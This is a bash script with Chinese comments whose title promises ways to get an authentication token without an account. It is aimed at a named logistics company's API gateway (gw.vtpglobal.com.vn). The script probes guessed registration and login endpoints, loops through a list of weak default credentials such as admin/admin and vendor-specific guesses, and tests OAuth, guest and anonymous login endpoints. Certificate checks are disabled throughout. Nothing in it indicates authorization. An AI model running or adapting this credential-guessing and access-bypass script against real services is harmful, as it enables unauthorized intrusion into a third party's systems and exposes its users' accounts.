#!/bin/bash
# 无账号获取Token - 5种方案

BASE="https://gw.vtpglobal.com.vn"

echo "[🔥] 方案1：测试APP注册接口（最简单）"
echo ""

# 1.1 查找注册端点
echo "[+] 测试注册端点..."
curl -sk "$BASE/vtp-user/api/v1/register" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test123","password":"Test@123","email":"test@test.com"}' \
  -w "\nHTTP: %{http_code}\n" | head -20

curl -sk "$BASE/vtp-user/api/v1/users/register" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test123","password":"Test@123"}' \
  -w "\nHTTP: %{http_code}\n" | head -20

curl -sk "$BASE/vtp-user/api/v1/auth/register" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"test123","password":"Test@123"}' \
  -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[+] 测试登录端点..."
curl -sk "$BASE/vtp-user/api/v1/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  -w "\nHTTP: %{http_code}\n" | head -20

curl -sk "$BASE/vtp-user/api/v1/auth/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' \
  -w "\nHTTP: %{http_code}\n" | head -20

echo ""
echo "[🔥] 方案2：测试弱口令默认账号"
echo ""

# 常见默认账号
ACCOUNTS=(
  '{"username":"admin","password":"admin"}'
  '{"username":"admin","password":"admin123"}'
  '{"username":"admin","password":"Admin@123"}'
  '{"username":"test","password":"test"}'
  '{"username":"test","password":"test123"}'
  '{"username":"guest","password":"guest"}'
  '{"username":"demo","password":"demo"}'
  '{"username":"user","password":"user"}'
  '{"username":"vtp","password":"vtp123"}'
  '{"username":"viettelpost","password":"vtp@123"}'
)

for account in "${ACCOUNTS[@]}"; do
  echo "[+] 测试: $account"
  curl -sk "$BASE/vtp-user/api/v1/auth/login" -X POST \
    -H "Content-Type: application/json" \
    -d "$account" -w "\nHTTP: %{http_code}\n" -m 3 | grep -E "token|HTTP:|success|message" | head -5
done

echo ""
echo "[🔥] 方案3：测试OAuth/Social Login"
echo ""

# 测试第三方登录
curl -sk "$BASE/vtp-user/api/v1/auth/google" -w "\nHTTP: %{http_code}\n" | head -10
curl -sk "$BASE/vtp-user/api/v1/auth/facebook" -w "\nHTTP: %{http_code}\n" | head -10
curl -sk "$BASE/vtp-user/api/v1/oauth/token" -w "\nHTTP: %{http_code}\n" | head -10

echo ""
echo "[🔥] 方案4：测试Guest/Anonymous访问"
echo ""

# 测试游客模式
curl -sk "$BASE/vtp-user/api/v1/auth/guest" -X POST \
  -H "Content-Type: application/json" \
  -d '{"deviceId":"test-device-123"}' -w "\nHTTP: %{http_code}\n" | head -20

curl -sk "$BASE/vtp-user/api/v1/auth/anonymous" -X POST \
  -H "Content-Type: application/json" \
  -d '{}' -w "\nHTTP: %{http_code}\n" | head -20
